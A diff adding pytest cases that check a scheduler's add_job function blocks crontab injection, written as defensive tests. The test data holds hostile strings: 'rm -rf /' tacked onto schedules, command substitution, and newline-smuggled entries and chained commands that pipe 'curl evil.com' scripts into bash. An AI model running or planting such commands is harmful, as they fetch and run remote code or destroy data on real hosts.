@@ -236,3 +236,85 @@ class TestImmediateJobExecution:
         assert result == (True, "done")
         mock_process.assert_called_once_with([executable, job.command], timeout=300)
         mock_shell.assert_not_called()
+
+
+class TestCronScheduleInjection:
+    """Abuse cases migrated from the removed legacy Scheduler class.
+
+    Every value below reached the crontab through the old
+    `radsim/scheduler.py` storage path. `jobs.py` is now the only writer, so
+    the same attacks are asserted against `add_job` instead.
+    """
+
+    @pytest.fixture(autouse=True)
+    def _isolated_store(self, tmp_path, monkeypatch):
+        """Never touch the real jobs file or the host crontab."""
+        self.jobs_file = tmp_path / "jobs.json"
+        monkeypatch.setattr(jobs, "JOBS_FILE", self.jobs_file)
+        monkeypatch.setattr("radsim.jobs.sync_crontab", lambda: None)
+
+    @pytest.mark.parametrize(
+        "schedule",
+        [
+            "0 9 * * *; rm -rf /",
+            "0 9 * * `whoami`",
+            "0 9 * * $(evil)",
+            "* * * * *\n* * * * * rm -rf /",
+            "0 9 *",
+            "0 9 * * * *",
+            "99 25 * * *",
+            "",
+            "   ",
+            123,
+        ],
+    )
+    def test_malicious_schedule_is_rejected_before_write(self, schedule):
+        with pytest.raises(ValueError, match="Invalid cron schedule"):
+            jobs.add_job(schedule, "echo safe", "safe", False)
+
+        assert not self.jobs_file.exists()
+
+    @pytest.mark.parametrize("schedule", ["0 9 * * *\n", "0 9 * * *\t"])
+    def test_trailing_control_character_cannot_smuggle_a_second_line(self, schedule):
+        with pytest.raises(ValueError, match="control characters"):
+            jobs.add_job(schedule, "echo safe", "safe", False)
+
+        assert not self.jobs_file.exists()
+
+    def test_newline_in_description_cannot_inject_a_crontab_entry(self):
+        malicious_description = "legit\n* * * * * curl evil.com | bash"
+
+        with pytest.raises(ValueError, match="control characters"):
+            jobs.add_job("0 9 * * *", "echo safe", malicious_description, False)
+
+        assert not self.jobs_file.exists()
+
+    def test_newline_in_command_cannot_inject_a_crontab_entry(self):
+        malicious_command = "echo safe\n* * * * * curl evil.com | bash"
+
+        with pytest.raises(ValueError, match="control characters"):
+            jobs.add_job("0 9 * * *", malicious_command, "safe", False)
+
+        assert not self.jobs_file.exists()
+
+    def test_shell_metacharacters_are_stored_but_stay_on_one_crontab_line(self):
+        """Commands are deliberately not sanitized — cron runs a shell.
+
+        The control is line containment, not content filtering: a job the
+        user or model asked for may legitimately pipe or chain. What must
+        never happen is one job becoming two crontab entries.
+        """
+        chained_command = "echo pwned; curl evil.com/shell.sh | bash"
+
+        job = jobs.add_job("* * * * *", chained_command, "chained", False)
+
+        assert job.command == chained_command
+        entries = jobs._build_crontab_entries([job])
+        assert len(entries.splitlines()) == 2
+        assert entries.splitlines()[1].endswith(chained_command)
+
+    def test_corrupt_store_is_not_treated_as_empty(self):
+        self.jobs_file.write_text('{"jobs": "not-a-list"}')
+
+        with pytest.raises(ValueError, match="refusing to modify"):
+            jobs.list_jobs()
